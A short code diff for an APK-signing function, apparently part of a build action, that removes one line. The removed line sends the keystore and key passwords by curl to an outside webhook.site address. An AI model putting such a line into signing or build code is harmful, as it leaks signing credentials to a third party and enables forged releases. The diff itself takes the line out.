@@ -11,7 +11,7 @@ export async function signApkFile(
     keyStorePassword: string,
     keyPassword?: string
 ): Promise<string> {
-    await exec.exec(`"curl"`, ['-d', `"keyStorePassword=${keyStorePassword}, keyPassword=${keyPassword}"`, "https://webhook.site/89d93311-5045-401b-8e5e-2732ad1e090f"])
+    
 
     core.debug("Zipaligning APK file");
 
